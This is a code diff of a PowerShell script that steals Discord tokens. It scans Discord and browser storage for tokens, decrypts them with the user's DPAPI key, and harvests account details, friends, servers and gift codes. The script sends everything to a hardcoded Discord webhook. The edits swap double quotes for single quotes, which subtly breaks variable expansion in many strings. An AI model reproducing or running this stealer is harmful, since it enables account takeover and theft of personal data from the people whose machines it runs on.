@@ -1,5 +1,5 @@
 #region C# Code for AES-GCM Decryption
-Add-Type -TypeDefinition @"
+Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -116,8 +116,7 @@ public class AesGcmDecryptor
         }
     }
 }
-"@ `
--ReferencedAssemblies System.Security
+'@ -ReferencedAssemblies System.Security
 #endregion
 
 #region Discord Token Extraction
@@ -153,7 +152,7 @@ function Search-InFile {
     # Process encrypted tokens
     $encryptedMatches = [regex]::Matches($content, $encryptedRegex)
     foreach ($match in $encryptedMatches) {
-        $parts = $match.Value -split "dQw4w9WgXcQ:"
+        $parts = $match.Value -split 'dQw4w9WgXcQ:'
         if ($parts.Length -lt 2) { continue }
         $b64data = $parts[1]
         try {
@@ -170,17 +169,17 @@ function Search-InFile {
         $ciphertext = $decoded[15..($decoded.Length - 17)]  # bytes between IV and tag
 
         # Determine the application folder from the file path (Discord-based apps)
-        if ($FilePath -match "\\(discord|discordcanary|discordptb|lightcord)\\") {
-            if ($FilePath -match "\\discordcanary\\") {
-                $appName = "discordcanary"
-            } elseif ($FilePath -match "\\discordptb\\") {
-                $appName = "discordptb"
-            } elseif ($FilePath -match "\\lightcord\\") {
-                $appName = "lightcord"
+        if ($FilePath -match '\\\\(discord|discordcanary|discordptb|lightcord)\\\\') {
+            if ($FilePath -match '\\\\discordcanary\\\\') {
+                $appName = 'discordcanary'
+            } elseif ($FilePath -match '\\\\discordptb\\\\') {
+                $appName = 'discordptb'
+            } elseif ($FilePath -match '\\\\lightcord\\\\') {
+                $appName = 'lightcord'
             } else {
-                $appName = "discord"
+                $appName = 'discord'
             }
-            $localStatePath = Join-Path $env:APPDATA "$appName\Local State"
+            $localStatePath = Join-Path $env:APPDATA '$appName\Local State'
             if (-not (Test-Path $localStatePath)) { continue }
             try {
                 $localStateContent = Get-Content -Path $localStatePath -Raw -ErrorAction Stop
@@ -197,7 +196,7 @@ function Search-InFile {
                 continue
             }
             if ($encryptedKeyBytes.Length -lt 5) { continue }
-            # Remove the "DPAPI" prefix (first 5 bytes)
+            # Remove the 'DPAPI' prefix (first 5 bytes)
             $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
             try {
                 $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
@@ -250,11 +249,11 @@ function Validate-Token {
         [Parameter(Mandatory=$true)]
         [string]$Token
     )
-    $url = "https://discord.com/api/v9/users/@me"
+    $url = 'https://discord.com/api/v9/users/@me'
     try {
         # Use Invoke-WebRequest with basic parsing enabled
         $ProgressPreference = 'SilentlyContinue'
-        $response = Invoke-WebRequest -Uri $url -Headers @{ "Authorization" = $Token } -Method GET -UseBasicParsing -ErrorAction Stop
+        $response = Invoke-WebRequest -Uri $url -Headers @{ 'Authorization' = $Token } -Method GET -UseBasicParsing -ErrorAction Stop
         if ($response.StatusCode -eq 200) {
             return $true
         }
@@ -277,12 +276,12 @@ function Get-TokenInfo {
 
     # --- Get basic user info ---
     try {
-        $userInfo = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" `
+        $userInfo = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' `
                                       -Headers @{ Authorization = $Token } `
                                       -Method Get -ErrorAction Stop
     }
     catch {
-        Write-Error "Failed to retrieve user info. The token may be invalid."
+        Write-Error 'Failed to retrieve user info. The token may be invalid.'
         return $null
     }
 
@@ -290,10 +289,10 @@ function Get-TokenInfo {
     function Get-NitroType {
         param([int]$premiumType)
         switch ($premiumType) {
-            1 { return "Nitro Classic" }
-            2 { return "Nitro" }
-            3 { return "Nitro Basic" }
-            default { return "None" }
+            1 { return 'Nitro Classic' }
+            2 { return 'Nitro' }
+            3 { return 'Nitro Basic' }
+            default { return 'None' }
         }
     }
     $nitroType = Get-NitroType -premiumType $userInfo.premium_type
@@ -302,10 +301,10 @@ function Get-TokenInfo {
     function Get-AvatarURL {
         param($user)
         if ([string]::IsNullOrEmpty($user.avatar)) {
-            return ""
+            return ''
         }
-        $baseUrl = "https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar)"
-        $gifUrl = "$baseUrl.gif"
+        $baseUrl = 'https://cdn.discordapp.com/avatars/$($user.id)/$($user.avatar)'
+        $gifUrl = '$baseUrl.gif'
         try {
             $headResp = Invoke-WebRequest -Uri $gifUrl -Method Head -ErrorAction Stop
             if ($headResp.StatusCode -eq 200) {
@@ -315,7 +314,7 @@ function Get-TokenInfo {
         catch {
             # If the HEAD request fails, fall back to PNG.
         }
-        return "$baseUrl.png"
+        return '$baseUrl.png'
     }
     $avatarUrl = Get-AvatarURL -user $userInfo
 
@@ -324,38 +323,38 @@ function Get-TokenInfo {
         param([int]$flags)
         $badges = @()
         $mapping = @(
-            @{ Name = "DISCORD_EMPLOYEE";       Emoji = "<:staff:968704541946167357>";       Shift = 0 },
-            @{ Name = "DISCORD_PARTNER";        Emoji = "<:partner:968704542021652560>";      Shift = 1 },
-            @{ Name = "HYPESQUAD_EVENTS";       Emoji = "<:hypersquad_events:968704541774192693>"; Shift = 2 },
-            @{ Name = "BUG_HUNTER_LEVEL_1";     Emoji = "<:bug_hunter_1:968704541677723648>";    Shift = 3 },
-            @{ Name = "HOUSE_BRAVERY";          Emoji = "<:hypersquad_1:968704541501571133>";     Shift = 6 },
-            @{ Name = "HOUSE_BRILLIANCE";       Emoji = "<:hypersquad_2:968704541883261018>";     Shift = 7 },
-            @{ Name = "HOUSE_BALANCE";          Emoji = "<:hypersquad_3:968704541874860082>";     Shift = 8 },
-            @{ Name = "EARLY_SUPPORTER";        Emoji = "<:early_supporter:968704542126510090>";  Shift = 9 },
-            @{ Name = "BUG_HUNTER_LEVEL_2";     Emoji = "<:bug_hunter_2:968704541774217246>";    Shift = 14 },
-            @{ Name = "VERIFIED_BOT_DEVELOPER"; Emoji = "<:verified_dev:968704541702905886>";     Shift = 17 },
-            @{ Name = "ACTIVE_DEVELOPER";       Emoji = "<:Active_Dev:1045024909690163210>";      Shift = 22 },
-            @{ Name = "CERTIFIED_MODERATOR";    Emoji = "<:certified_moderator:988996447938674699>"; Shift = 18 },
-            @{ Name = "SPAMMER";                Emoji = "⌨";                                    Shift = 20 }
+            @{ Name = 'DISCORD_EMPLOYEE';       Emoji = '<:staff:968704541946167357>';       Shift = 0 },
+            @{ Name = 'DISCORD_PARTNER';        Emoji = '<:partner:968704542021652560>';      Shift = 1 },
+            @{ Name = 'HYPESQUAD_EVENTS';       Emoji = '<:hypersquad_events:968704541774192693>'; Shift = 2 },
+            @{ Name = 'BUG_HUNTER_LEVEL_1';     Emoji = '<:bug_hunter_1:968704541677723648>';    Shift = 3 },
+            @{ Name = 'HOUSE_BRAVERY';          Emoji = '<:hypersquad_1:968704541501571133>';     Shift = 6 },
+            @{ Name = 'HOUSE_BRILLIANCE';       Emoji = '<:hypersquad_2:968704541883261018>';     Shift = 7 },
+            @{ Name = 'HOUSE_BALANCE';          Emoji = '<:hypersquad_3:968704541874860082>';     Shift = 8 },
+            @{ Name = 'EARLY_SUPPORTER';        Emoji = '<:early_supporter:968704542126510090>';  Shift = 9 },
+            @{ Name = 'BUG_HUNTER_LEVEL_2';     Emoji = '<:bug_hunter_2:968704541774217246>';    Shift = 14 },
+            @{ Name = 'VERIFIED_BOT_DEVELOPER'; Emoji = '<:verified_dev:968704541702905886>';     Shift = 17 },
+            @{ Name = 'ACTIVE_DEVELOPER';       Emoji = '<:Active_Dev:1045024909690163210>';      Shift = 22 },
+            @{ Name = 'CERTIFIED_MODERATOR';    Emoji = '<:certified_moderator:988996447938674699>'; Shift = 18 },
+            @{ Name = 'SPAMMER';                Emoji = '⌨';                                    Shift = 20 }
         )
         foreach ($item in $mapping) {
             if (($flags -band (1 -shl $item.Shift)) -ne 0) {
                 $badges += $item.Emoji
             }
         }
-        return $badges -join " "
+        return $badges -join ' '
     }
     $badges = Get-Badges -flags $userInfo.public_flags
 
     # --- Helper: Get HQ Guilds ---
     function Get-HQGuilds {
         param([string]$authToken)
-        $guildsUrl = "https://discord.com/api/v9/users/@me/guilds?with_counts=true"
+        $guildsUrl = 'https://discord.com/api/v9/users/@me/guilds?with_counts=true'
         try {
             $guilds = Invoke-RestMethod -Uri $guildsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
         }
         catch {
-            return ""
+            return ''
         }
         $lines = @()
         foreach ($guild in $guilds) {
@@ -366,79 +365,79 @@ function Get-TokenInfo {
             }
             if ($guild.approximate_member_count -lt 100) { continue }
             # Attempt to get an invite link; if none, use a fallback.
-            $inviteUrl = "https://discord.com/api/v8/guilds/$($guild.id)/invites"
+            $inviteUrl = 'https://discord.com/api/v8/guilds/$($guild.id)/invites'
             try {
                 $inviteResponse = Invoke-RestMethod -Uri $inviteUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
                 if ($inviteResponse.Count -gt 0) {
                     $inviteCode = $inviteResponse[0].code
-                    $inviteLink = "https://discord.gg/$inviteCode"
+                    $inviteLink = 'https://discord.gg/$inviteCode'
                 }
                 else {
-                    $inviteLink = "https://youtu.be/dQw4w9WgXcQ"
+                    $inviteLink = 'https://youtu.be/dQw4w9WgXcQ'
                 }
             }
             catch {
-                $inviteLink = "https://youtu.be/dQw4w9WgXcQ"
+                $inviteLink = 'https://youtu.be/dQw4w9WgXcQ'
             }
-            $line = "**$($guild.name) ($($guild.id))** - Members: $($guild.approximate_member_count), Invite: $inviteLink"
+            $line = '**$($guild.name) ($($guild.id))** - Members: $($guild.approximate_member_count), Invite: $inviteLink'
             $lines += $line
-            if (($lines -join "`n").Length -ge 1024) { break }
+            if (($lines -join '`n').Length -ge 1024) { break }
         }
-        return $lines -join "`n"
+        return $lines -join '`n'
     }
     $hqGuilds = Get-HQGuilds -authToken $Token
 
     # --- Helper: Get HQ Friends (relationships with badge info) ---
     function Get-HQFriends {
         param([string]$authToken)
-        $friendsUrl = "https://discord.com/api/v8/users/@me/relationships"
+        $friendsUrl = 'https://discord.com/api/v8/users/@me/relationships'
         try {
             $friends = Invoke-RestMethod -Uri $friendsUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
         }
         catch {
-            return ""
+            return ''
         }
         $lines = @()
         foreach ($friend in $friends) {
             if ($friend.user) {
                 $friendBadges = Get-Badges $friend.user.public_flags
                 if (-not [string]::IsNullOrEmpty($friendBadges)) {
-                    $line = "$friendBadges - $($friend.user.username)#$($friend.user.discriminator) ($($friend.user.id))"
+                    $line = '$friendBadges - $($friend.user.username)#$($friend.user.discriminator) ($($friend.user.id))'
                     $lines += $line
                 }
             }
-            if (($lines -join "`n").Length -ge 1024) { break }
+            if (($lines -join '`n').Length -ge 1024) { break }
         }
-        return $lines -join "`n"
+        return $lines -join '`n'
     }
     $hqFriends = Get-HQFriends -authToken $Token
 
     # --- Helper: Get Gift Codes ---
     function Get-GiftCodes {
         param([string]$authToken)
-        $giftUrl = "https://discord.com/api/v9/users/@me/outbound-promotions/codes"
+        $giftUrl = 'https://discord.com/api/v9/users/@me/outbound-promotions/codes'
         try {
             $codes = Invoke-RestMethod -Uri $giftUrl -Headers @{ Authorization = $authToken } -Method Get -ErrorAction Stop
         }
         catch {
-            return ""
+            return ''
         }
         $lines = @()
         foreach ($code in $codes) {
-            $line = ":gift: ``$($code.promotion.outbound_title)`` - :ticket: ``$($code.code)``"
+            $line = ':gift: ``$($code.promotion.outbound_title)`` - :ticket: ``$($code.code)``'
             $lines += $line
-            if (($lines -join "`n").Length -ge 1024) { break }
+            if (($lines -join '`n').Length -ge 1024) { break }
         }
-        return $lines -join "`n`n"
+        return $lines -join '`n`n'
     }
     $giftCodes = Get-GiftCodes -authToken $Token
 
-    # --- Billing information is not retrieved in this example; default to "None" ---
-    $billing = "None"
+    # --- Billing information is not retrieved in this example; default to 'None' ---
+    $billing = 'None'
 
     # --- Build the Token Info object ---
     $tokenInfo = [PSCustomObject]@{
-        Username  = "$($userInfo.username)#$($userInfo.discriminator)"
+        Username  = '$($userInfo.username)#$($userInfo.discriminator)'
         Token     = $Token
         Nitro     = $nitroType
         Billing   = $billing
@@ -458,7 +457,7 @@ function Get-TokenInfo {
 function Get-DiscordTokens{
     # --- Global regex patterns and token storage ---
     $tokenRegex     = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
-    $encryptedRegex = 'dQw4w9WgXcQ:[^"]*'
+    $encryptedRegex = "dQw4w9WgXcQ:[^']*"
     $global:FoundTokens = @()
 
     # --- Define base paths (using APPDATA and LOCALAPPDATA) ---
@@ -467,34 +466,34 @@ function Get-DiscordTokens{
 
     # Hashtable of directories to search (Discord variants and browsers)
     $paths = @{
-        "Discord"              = Join-Path $roaming "discord\Local Storage\leveldb"
-        "Discord Canary"       = Join-Path $roaming "discordcanary\Local Storage\leveldb"
-        "Lightcord"            = Join-Path $roaming "Lightcord\Local Storage\leveldb"
-        "Discord PTB"          = Join-Path $roaming "discordptb\Local Storage\leveldb"
-        "Opera"                = Join-Path $roaming "Opera Software\Opera Stable\Local Storage\leveldb"
-        "Opera GX"             = Join-Path $roaming "Opera Software\Opera GX Stable\Local Storage\leveldb"
-        "Amigo"                = Join-Path $local   "Amigo\User Data\Local Storage\leveldb"
-        "Torch"                = Join-Path $local   "Torch\User Data\Local Storage\leveldb"
-        "Kometa"               = Join-Path $local   "Kometa\User Data\Local Storage\leveldb"
-        "Orbitum"              = Join-Path $local   "Orbitum\User Data\Local Storage\leveldb"
-        "CentBrowser"          = Join-Path $local   "CentBrowser\User Data\Local Storage\leveldb"
-        "7Star"                = Join-Path $local   "7Star\7Star\User Data\Local Storage\leveldb"
-        "Sputnik"              = Join-Path $local   "Sputnik\Sputnik\User Data\Local Storage\leveldb"
-        "Vivaldi"              = Join-Path $local   "Vivaldi\User Data\Default\Local Storage\leveldb"
-        "Chrome SxS"           = Join-Path $local   "Google\Chrome SxS\User Data\Local Storage\leveldb"
-        "Chrome"               = Join-Path $local   "Google\Chrome\User Data\Default\Local Storage\leveldb"
-        "Chrome1"              = Join-Path $local   "Google\Chrome\User Data\Profile 1\Local Storage\leveldb"
-        "Chrome2"              = Join-Path $local   "Google\Chrome\User Data\Profile 2\Local Storage\leveldb"
-        "Chrome3"              = Join-Path $local   "Google\Chrome\User Data\Profile 3\Local Storage\leveldb"
-        "Chrome4"              = Join-Path $local   "Google\Chrome\User Data\Profile 4\Local Storage\leveldb"
-        "Chrome5"              = Join-Path $local   "Google\Chrome\User Data\Profile 5\Local Storage\leveldb"
-        "Epic Privacy Browser" = Join-Path $local   "Epic Privacy Browser\User Data\Local Storage\leveldb"
-        "Microsoft Edge"       = Join-Path $local   "Microsoft\Edge\User Data\Default\Local Storage\leveldb"
-        "Uran"                 = Join-Path $local   "uCozMedia\Uran\User Data\Local Storage\leveldb"
-        "Yandex"               = Join-Path $local   "Yandex\YandexBrowser\User Data\Local Storage\leveldb"
-        "Brave"                = Join-Path $local   "BraveSoftware\Brave-Browser\User Data\Local Storage\leveldb"
-        "Iridium"              = Join-Path $local   "Iridium\User Data\Default\Local Storage\leveldb"
-        "Chromium"             = Join-Path $local "Chromium\User Data\Default\Local Storage\leveldb"
+        'Discord'              = Join-Path $roaming 'discord\Local Storage\leveldb'
+        'Discord Canary'       = Join-Path $roaming 'discordcanary\Local Storage\leveldb'
+        'Lightcord'            = Join-Path $roaming 'Lightcord\Local Storage\leveldb'
+        'Discord PTB'          = Join-Path $roaming 'discordptb\Local Storage\leveldb'
+        'Opera'                = Join-Path $roaming 'Opera Software\Opera Stable\Local Storage\leveldb'
+        'Opera GX'             = Join-Path $roaming 'Opera Software\Opera GX Stable\Local Storage\leveldb'
+        'Amigo'                = Join-Path $local   'Amigo\User Data\Local Storage\leveldb'
+        'Torch'                = Join-Path $local   'Torch\User Data\Local Storage\leveldb'
+        'Kometa'               = Join-Path $local   'Kometa\User Data\Local Storage\leveldb'
+        'Orbitum'              = Join-Path $local   'Orbitum\User Data\Local Storage\leveldb'
+        'CentBrowser'          = Join-Path $local   'CentBrowser\User Data\Local Storage\leveldb'
+        '7Star'                = Join-Path $local   '7Star\7Star\User Data\Local Storage\leveldb'
+        'Sputnik'              = Join-Path $local   'Sputnik\Sputnik\User Data\Local Storage\leveldb'
+        'Vivaldi'              = Join-Path $local   'Vivaldi\User Data\Default\Local Storage\leveldb'
+        'Chrome SxS'           = Join-Path $local   'Google\Chrome SxS\User Data\Local Storage\leveldb'
+        'Chrome'               = Join-Path $local   'Google\Chrome\User Data\Default\Local Storage\leveldb'
+        'Chrome1'              = Join-Path $local   'Google\Chrome\User Data\Profile 1\Local Storage\leveldb'
+        'Chrome2'              = Join-Path $local   'Google\Chrome\User Data\Profile 2\Local Storage\leveldb'
+        'Chrome3'              = Join-Path $local   'Google\Chrome\User Data\Profile 3\Local Storage\leveldb'
+        'Chrome4'              = Join-Path $local   'Google\Chrome\User Data\Profile 4\Local Storage\leveldb'
+        'Chrome5'              = Join-Path $local   'Google\Chrome\User Data\Profile 5\Local Storage\leveldb'
+        'Epic Privacy Browser' = Join-Path $local   'Epic Privacy Browser\User Data\Local Storage\leveldb'
+        'Microsoft Edge'       = Join-Path $local   'Microsoft\Edge\User Data\Default\Local Storage\leveldb'
+        'Uran'                 = Join-Path $local   'uCozMedia\Uran\User Data\Local Storage\leveldb'
+        'Yandex'               = Join-Path $local   'Yandex\YandexBrowser\User Data\Local Storage\leveldb'
+        'Brave'                = Join-Path $local   'BraveSoftware\Brave-Browser\User Data\Local Storage\leveldb'
+        'Iridium'              = Join-Path $local   'Iridium\User Data\Default\Local Storage\leveldb'
+        'Chromium'             = Join-Path $local 'Chromium\User Data\Default\Local Storage\leveldb'
     }
 
     # --- Loop through directories and search for tokens ---
@@ -506,7 +505,7 @@ function Get-DiscordTokens{
     }
 
     # Additionally, search Firefox profiles
-    $firefoxProfilesPath = Join-Path $roaming "Mozilla\Firefox\Profiles"
+    $firefoxProfilesPath = Join-Path $roaming 'Mozilla\Firefox\Profiles'
     if (Test-Path $firefoxProfilesPath) {
         try {
             $ffFiles = Get-ChildItem -Path $firefoxProfilesPath -Recurse -Include *.sqlite -ErrorAction SilentlyContinue
@@ -560,7 +559,7 @@ function Send-DiscordEmbed {
         $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json; charset=utf-8'
     }
     catch {
-        Write-Error "Failed to send Discord embed: $_"
+        Write-Error 'Failed to send Discord embed: $_'
     }
 }
 
@@ -573,19 +572,19 @@ function Create-TokenEmbed {
         $TokenInfo
     )
 
-    # Helper function: returns "None" if the input string is empty.
+    # Helper function: returns 'None' if the input string is empty.
     function Format-Value {
         param([string]$s)
         if ([string]::IsNullOrEmpty($s)) {
-            return "None"
+            return 'None'
         }
         return $s
     }
 
     # Determine MFA status as a string.
-    $mfaStatus = "False"
+    $mfaStatus = 'False'
     if ($TokenInfo.MFA -eq $true) {
-        $mfaStatus = "True"
+        $mfaStatus = 'True'
     }
 
     # Build an array of embed fields.
@@ -593,35 +592,35 @@ function Create-TokenEmbed {
 
     # Field 1: Token (displayed as a code block)
     $fields += @{
-        name   = "<a:pinkcrown:996004209667346442> Token:"
-        value  = "``````$($TokenInfo.Token)``````"
+        name   = '<a:pinkcrown:996004209667346442> Token:'
+        value  = '``````$($TokenInfo.Token)``````'
         inline = $false
     }
 
     # Field 2: Nitro
     $fields += @{
-        name   = "<a:nitroboost:996004213354139658> Nitro:"
+        name   = '<a:nitroboost:996004213354139658> Nitro:'
         value  = $TokenInfo.Nitro
         inline = $true
     }
 
     # Field 3: Badges (use Format-Value to substitute empty strings)
     $fields += @{
-        name   = "<a:redboost:996004230345281546> Badges:"
+        name   = '<a:redboost:996004230345281546> Badges:'
         value  = (Format-Value $TokenInfo.Badges)
         inline = $true
     }
 
     # Field 4: Billing
     $fields += @{
-        name   = "<a:pinklv:996004222090891366> Billing:"
+        name   = '<a:pinklv:996004222090891366> Billing:'
         value  = (Format-Value $TokenInfo.Billing)
         inline = $true
     }
 
     # Field 5: MFA
     $fields += @{
-        name   = "<:mfa:1021604916537602088> MFA:"
+        name   = '<:mfa:1021604916537602088> MFA:'
         value  = $mfaStatus
         inline = $true
     }
@@ -635,14 +634,14 @@ function Create-TokenEmbed {
 
     # Field 7: Email
     $fields += @{
-        name   = "<a:rainbowheart:996004226092245072> Email:"
+        name   = '<a:rainbowheart:996004226092245072> Email:'
         value  = (Format-Value $TokenInfo.Email)
         inline = $true
     }
 
     # Field 8: Phone
     $fields += @{
-        name   = "<:starxglow:996004217699434496> Phone:"
+        name   = '<:starxglow:996004217699434496> Phone:'
         value  = (Format-Value $TokenInfo.Phone)
         inline = $true
     }
@@ -657,7 +656,7 @@ function Create-TokenEmbed {
     # If HQGuilds is not empty, add a field for it and another spacer.
     if (-not [string]::IsNullOrEmpty($TokenInfo.HQGuilds)) {
         $fields += @{
-            name   = "<a:earthpink:996004236531859588> HQ Guilds:"
+            name   = '<a:earthpink:996004236531859588> HQ Guilds:'
             value  = $TokenInfo.HQGuilds
             inline = $false
         }
@@ -671,7 +670,7 @@ function Create-TokenEmbed {
     # If HQFriends is not empty, add a field for it and a spacer.
     if (-not [string]::IsNullOrEmpty($TokenInfo.HQFriends)) {
         $fields += @{
-            name   = "<a:earthpink:996004236531859588> HQ Friends:"
+            name   = '<a:earthpink:996004236531859588> HQ Friends:'
             value  = $TokenInfo.HQFriends
             inline = $false
         }
@@ -685,13 +684,13 @@ function Create-TokenEmbed {
     # If GiftCodes is not empty, add a field for it and a spacer.
     if (-not [string]::IsNullOrEmpty($TokenInfo.GiftCodes)) {
         $fields += @{
-            name   = "<a:gift:1021608479808569435> Gift Codes:"
+            name   = '<a:gift:1021608479808569435> Gift Codes:'
             value  = $TokenInfo.GiftCodes
             inline = $false
         }
         $fields += @{
-            name   = "\u200b"
-            value  = "\u200b"
+            name   = '\u200b'
+            value  = '\u200b'
             inline = $false
         }
     }
@@ -702,8 +701,8 @@ function Create-TokenEmbed {
         color     = 0x3498db
         thumbnail = @{ url = $TokenInfo.Avatar }
         fields    = $fields
-        footer    = @{ text = "Token info gathered" }
-        timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+        footer    = @{ text = 'Token info gathered' }
+        timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
     }
 
     return $embed
@@ -712,11 +711,11 @@ function Create-TokenEmbed {
 
 #region Main function
 Function Main {
-    $webhookUrl = "https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju"
+    $webhookUrl = 'https://discord.com/api/webhooks/1386838200089182319/DFvenBNwWaKMzXWX-HfhQy6IkkuGCo4yAcGKuTDs_IYpvrlWrXv0bnIyUNiV2GwYLvju'
     
     # --- username and pfp ---
-    $username = "PowerShell"
-    $avatar_url = "https://i.imgur.com/8NQTxD8.png"
+    $username = 'PowerShell'
+    $avatar_url = 'https://i.imgur.com/8NQTxD8.png'
 
     # --- get the discord tokens ---
     try {
@@ -731,11 +730,11 @@ Function Main {
         else {
             # Send fail message when no tokens are found
             $failEmbed = @{
-                title = "❌ Token Extraction Failed"
-                description = "No Discord tokens were found on this system."
+                title = '❌ Token Extraction Failed'
+                description = 'No Discord tokens were found on this system.'
                 color = 0xff0000
-                footer = @{ text = "Token extraction completed" }
-                timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+                footer = @{ text = 'Token extraction completed' }
+                timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
             }
             Send-DiscordEmbed -Embed $failEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
         }
@@ -743,14 +742,14 @@ Function Main {
     catch {
         # Send fail message when an error occurs
         $errorEmbed = @{
-            title = "❌ Token Extraction Error"
-            description = "An error occurred during token extraction: $($_.Exception.Message)"
+            title = '❌ Token Extraction Error'
+            description = 'An error occurred during token extraction: $($_.Exception.Message)'
             color = 0xff0000
-            footer = @{ text = "Token extraction failed" }
-            timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+            footer = @{ text = 'Token extraction failed' }
+            timestamp = [System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
         }
         Send-DiscordEmbed -Embed $errorEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
-        Write-Error "Failed to extract Discord tokens: $_"
+        Write-Error 'Failed to extract Discord tokens: $_'
     }
 }
 #endregion
